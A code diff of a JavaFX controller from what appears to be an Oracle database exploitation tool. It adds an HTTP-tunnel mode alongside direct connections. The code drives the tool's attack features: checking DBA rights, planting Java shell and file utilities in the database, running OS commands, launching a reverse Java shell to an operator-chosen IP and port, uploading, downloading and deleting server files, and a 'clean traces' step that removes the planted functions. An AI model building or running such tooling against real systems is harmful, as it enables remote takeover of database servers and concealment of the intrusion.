@@ -1,7 +1,7 @@
 package Controller;
 
-
 import Dao.OracleDao;
+import Dao.OracleHttpDao;
 import Entity.ControllersFactory;
 import Entity.FilesEntity;
 import Util.MessageUtil;
@@ -19,7 +19,6 @@ import javafx.scene.control.cell.PropertyValueFactory;
 import javafx.scene.image.Image;
 import javafx.scene.image.ImageView;
 import javafx.scene.layout.HBox;
-import javafx.stage.DirectoryChooser;
 import javafx.stage.FileChooser;
 import javafx.stage.Stage;
 import org.json.JSONObject;
@@ -154,6 +153,8 @@ public class OracleController implements Initializable {
 
     private String reverseUserData = "";
 
+    private OracleHttpDao oracleHttpDao = null;
+
     private List workList = new ArrayList();
 
     public List getWorkList() {
@@ -167,6 +168,7 @@ public class OracleController implements Initializable {
     public void initOraclelDao(JSONObject dbObj){
         this.dataObj = dbObj;
         oracleLogTextArea.appendText(Utils.log("正在连接..."));
+
     }
 
 
@@ -195,26 +197,37 @@ public class OracleController implements Initializable {
         initToggleGroup();
         initFilesTableViews();
         Runnable runner = () -> {
-            try {
-                this.oracleDao = new OracleDao(this.dataObj.getString("ipaddress"),this.dataObj.getString("port"),this.dataObj.getString("database"),this.dataObj.getString("username"),this.dataObj.getString("password"),this.dataObj.getString("timeout"));
-                this.oracleDao.getConnection();
+            if("false".equals(this.dataObj.getString("ishttp"))){
+                try {
+                    this.oracleDao = new OracleDao(this.dataObj.getString("ipaddress"),this.dataObj.getString("port"),this.dataObj.getString("database"),this.dataObj.getString("username"),this.dataObj.getString("password"),this.dataObj.getString("timeout"));
+                    this.oracleDao.getConnection();
+                    Platform.runLater(() -> {
+                        oracleLogTextArea.appendText(Utils.log("连接成功！"));
+                        // 检查数据库账户权限
+                        this.oracleDao.isDBA();
+                        // 获取版本
+                        this.oracleDao.getVersion();
+                    });
+                }catch (Exception e){
+                    Platform.runLater(() -> {
+                        oracleLogTextArea.appendText(Utils.log("连接失败！"));
+                        MessageUtil.showExceptionMessage(e,e.getMessage());
+                        try {
+                            this.oracleDao.closeConnection();
+                        }catch (Exception ex){
+                        }
+                    });
+                }
+            }else {
                 Platform.runLater(() -> {
-                    oracleLogTextArea.appendText(Utils.log("连接成功！"));
-                    // 检查数据库账户权限
-                    this.oracleDao.isDBA();
-                    // 获取版本
-                    this.oracleDao.getVersion();
-                });
-            }catch (Exception e){
-                Platform.runLater(() -> {
-                    oracleLogTextArea.appendText(Utils.log("连接失败！"));
-                    MessageUtil.showExceptionMessage(e,e.getMessage());
-                    try {
-                        this.oracleDao.closeConnection();
-                    }catch (Exception ex){
+                    this.oracleHttpDao = new OracleHttpDao(this.dataObj);
+                    if(this.oracleHttpDao.getConnection()){
+                        this.oracleHttpDao.isDBA();
+                        this.oracleHttpDao.getVersion();
                     }
                 });
             }
+
         };
         Thread workThrad = new Thread(runner);
         this.workList.add(workThrad);
@@ -306,8 +319,17 @@ public class OracleController implements Initializable {
             //设置root节点
             TreeItem rootitem = new TreeItem<>();
             Image diskImage = new Image(getClass().getResourceAsStream("/images/disk.png"));
-            //获取到磁盘个数
-            ArrayList<String> disk = this.oracleDao.getDisk();
+            ArrayList<String> disk = null;
+            if("false".equals(this.dataObj.getString("ishttp"))){
+                //获取到磁盘个数
+                disk = this.oracleDao.getDisk();
+            }else {
+                disk = this.oracleHttpDao.getDisk();
+            }
+            if(disk == null || disk.size() == 0){
+                return;
+            }
+
             // 如果是linux则不需要加 :/
             if("/".equals(disk.get(0))){
                 //默认设置第一个盘为当前路径
@@ -347,7 +369,13 @@ public class OracleController implements Initializable {
         TextField_FilePath.setText(path);
         // 清除旧数据
         treeItem.getChildren().clear();
-        arrayFiles = this.oracleDao.getFiles(path,code);
+        if("false".equals(this.dataObj.getString("ishttp"))) {
+            // 获取当前路径所有文件夹和文件
+            arrayFiles = this.oracleDao.getFiles(path,code);
+        }else {
+            arrayFiles = this.oracleHttpDao.getFiles(path,code);
+        }
+        //arrayFiles = this.oracleDao.getFiles(path,code);
         if("null".equals(arrayFiles.get(0))){
             oracleLogTextArea.appendText(Utils.log("路径读取失败！可能当前路径没有文件！"));
         }else {
@@ -378,8 +406,13 @@ public class OracleController implements Initializable {
                 // 清除旧数据，防止数据叠加
                 fileData.clear();
                 ArrayList<String> arrayFiles = new ArrayList<String>();
-                // 获取当前路径所有文件夹和文件
-                arrayFiles = this.oracleDao.getFiles(path,code);
+                if("false".equals(this.dataObj.getString("ishttp"))) {
+                    // 获取当前路径所有文件夹和文件
+                    arrayFiles = this.oracleDao.getFiles(path,code);
+                }else {
+                    arrayFiles = this.oracleHttpDao.getFiles(path,code);
+                }
+
                 if("null".equals(arrayFiles.get(0))){
                     oracleLogTextArea.appendText(Utils.log("路径读取失败！可能当前路径没有文件！"));
                 }else {
@@ -443,7 +476,12 @@ public class OracleController implements Initializable {
             Platform.runLater(() -> {
                 oracleLogTextArea.appendText(Utils.log("正在初始化，请稍等..."));
             });
-            this.oracleDao.importShellUtilJAVA();
+            if("false".equals(this.dataObj.getString("ishttp"))){
+                this.oracleDao.importShellUtilJAVA();
+            }else {
+                this.oracleHttpDao.importShellUtilJAVA();
+            }
+
         };
         Thread workThrad = new Thread(runner);
         workThrad.start();
@@ -455,7 +493,11 @@ public class OracleController implements Initializable {
             Platform.runLater(() -> {
                 oracleLogTextArea.appendText(Utils.log("正在初始化，请稍等..."));
             });
-            this.oracleDao.importFileUtilJAVA();
+            if("false".equals(this.dataObj.getString("ishttp"))) {
+                this.oracleDao.importFileUtilJAVA();
+            }else {
+                this.oracleHttpDao.importFileUtilJAVA();
+            }
 
         };
         Thread workThrad = new Thread(runner);
@@ -469,8 +511,14 @@ public class OracleController implements Initializable {
             Platform.runLater(() -> {
                 oracleLogTextArea.appendText(Utils.log("正在清理痕迹，请稍等..."));
             });
-            this.oracleDao.deleteShellFunction();
-            this.oracleDao.deleteFileFunction();
+            if("false".equals(this.dataObj.getString("ishttp"))) {
+                this.oracleDao.deleteShellFunction();
+                this.oracleDao.deleteFileFunction();
+            }else {
+                this.oracleHttpDao.deleteShellFunction();
+                this.oracleHttpDao.deleteFileFunction();
+            }
+
         };
         Thread workThrad = new Thread(runner);
         workThrad.start();
@@ -483,23 +531,29 @@ public class OracleController implements Initializable {
         String command = TextField_OracleCommand.getText();
 
         if(code == null && !"scheduler".equals(userData)){
-            MessageUtil.showErrorMessage("错误","请选择编码！");
+            MessageUtil.showErrorMessage("请选择编码！");
             return;
         }else if("".equals(command)){
-            MessageUtil.showErrorMessage("错误","请输入命令！");
+            MessageUtil.showErrorMessage("请输入命令！");
             return;
         }else if("".equals(userData)){
-            MessageUtil.showErrorMessage("错误","请选择命令执行类型！");
+            MessageUtil.showErrorMessage("请选择命令执行类型！");
             return;
         }
         Runnable runner = () -> {
             Platform.runLater(() -> {
                 oracleLogTextArea.appendText(Utils.log("正在执行命令，请稍等..."));
             });
-            String res = this.oracleDao.executeCommand(command,code,userData);
+            String res = null;
+            if("false".equals(this.dataObj.getString("ishttp"))) {
+                res = this.oracleDao.executeCommand(command,code,userData);
+            }else {
+                res = this.oracleHttpDao.executeCommand(command,code,userData);
+            }
             if(!"".equals(res)){
+                String finalRes = res;
                 Platform.runLater(() -> {
-                    Textarea_OracleCommandResult.setText(res);
+                    Textarea_OracleCommandResult.setText(finalRes);
                 });
             }
         };
@@ -510,13 +564,13 @@ public class OracleController implements Initializable {
     @FXML
     void reverseRun(ActionEvent event) {
         if ("".equals(reverseAddressTextField)){
-            MessageUtil.showErrorMessage("错误","请输入回连地址！");
+            MessageUtil.showErrorMessage("请输入回连地址！");
             return;
         }else if("".equals(reversePortTextField)){
-            MessageUtil.showErrorMessage("错误","请输入回连端口！");
+            MessageUtil.showErrorMessage("请输入回连端口！");
             return;
         }else if("".equals(reverseUserData)){
-            MessageUtil.showErrorMessage("错误","请选择回连模式！");
+            MessageUtil.showErrorMessage("请选择回连模式！");
             return;
         }
         String ip = reverseAddressTextField.getText();
@@ -526,7 +580,11 @@ public class OracleController implements Initializable {
                 Platform.runLater(() -> {
                     oracleLogTextArea.appendText(Utils.log("正在执行反弹命令，请稍等..."));
                 });
-                this.oracleDao.reverseJavaShell(ip,port);
+                if("false".equals(this.dataObj.getString("ishttp"))) {
+                    this.oracleDao.reverseJavaShell(ip,port);
+                }else {
+                    this.oracleHttpDao.reverseJavaShell(ip,port);
+                }
             };
             Thread workThrad = new Thread(runner);
             workThrad.start();
@@ -609,13 +667,16 @@ public class OracleController implements Initializable {
                 });
                 String res = null;
                 res = Utils.bytes2HexString(Utils.toByteArray(file.getAbsolutePath()));
-                this.oracleDao.upload(TextField_FilePath.getText()+file.getName(),res);
+                if("false".equals(this.dataObj.getString("ishttp"))) {
+                    this.oracleDao.upload(TextField_FilePath.getText()+file.getName(),res);
+                }else {
+                    this.oracleHttpDao.upload(TextField_FilePath.getText()+file.getName(),res);
+                }
                 showFilesOnTable(TextField_FilePath.getText(),"");
             };
             Thread workThrad = new Thread(runnable);
             workThrad.start();
         }
-
     }
 
     @FXML
@@ -640,7 +701,12 @@ public class OracleController implements Initializable {
                         oracleLogTextArea.appendText(Utils.log("正在删除请稍等..."));
                     });
                     try {
-                        String temp = this.oracleDao.delete(path+fileName).replace("\n","");
+                        String temp = null;
+                        if("false".equals(this.dataObj.getString("ishttp"))) {
+                            temp = this.oracleDao.delete(path+fileName).replace("\n","");
+                        }else {
+                            temp = this.oracleHttpDao.delete(path+fileName).replace("\n","");
+                        }
                         if("success".equals(temp)){
                             Platform.runLater(() ->{
                                 oracleLogTextArea.appendText(Utils.log("删除成功!"));
@@ -678,16 +744,17 @@ public class OracleController implements Initializable {
             String fileType = this.TableView_Filetable.getSelectionModel().getSelectedItem().getFileType();
             String path = TextField_FilePath.getText();
             if("folder".equals(fileType)){
-                MessageUtil.showErrorMessage("错误","不能下载文件夹！");
+                MessageUtil.showErrorMessage("不能下载文件夹！");
                 return;
             }
             if("".equals(TextField_FilePath.getText()) || "".equals(fileName)){
-                MessageUtil.showErrorMessage("错误","当前文件不存在！");
+                MessageUtil.showErrorMessage("当前文件不存在！");
                 return;
             }
-            DirectoryChooser dc = new DirectoryChooser();
+            FileChooser dc = new FileChooser();
             dc.setTitle("选择一个文件夹");
-            File file = dc.showDialog(new Stage());
+            dc.setInitialFileName(fileName);
+            File file = dc.showSaveDialog(new Stage());
             if(file != null){
                 //System.out.println(file.getAbsolutePath());
                 Runnable runnable = () -> {
@@ -696,11 +763,19 @@ public class OracleController implements Initializable {
                     });
                     try {
                         // 下载文本的hex数据
-                        String res = this.oracleDao.download(path+fileName);
+                        String res = null;
+                        if("false".equals(this.dataObj.getString("ishttp"))) {
+                            res = this.oracleDao.download(path+fileName);
+                        }else {
+                            res = this.oracleHttpDao.download(path+fileName);
+                            if(res.contains("ERROR://")){
+                                throw new Exception(res.replace("ERROR://",""));
+                            }
+                        }
                         // 将 hex 数据转为 byte 数组
                         byte[] resByte = Utils.hexToByte(res);
                         // 写入到本地文件
-                        Utils.writeFileByBytes(file.getAbsolutePath() + File.separator + fileName,resByte,false);
+                        Utils.writeFileByBytes(file.toString(),resByte,false);
                         Platform.runLater(() ->{
                             oracleLogTextArea.appendText(Utils.log(fileName + " 下载成功!"));
                         });
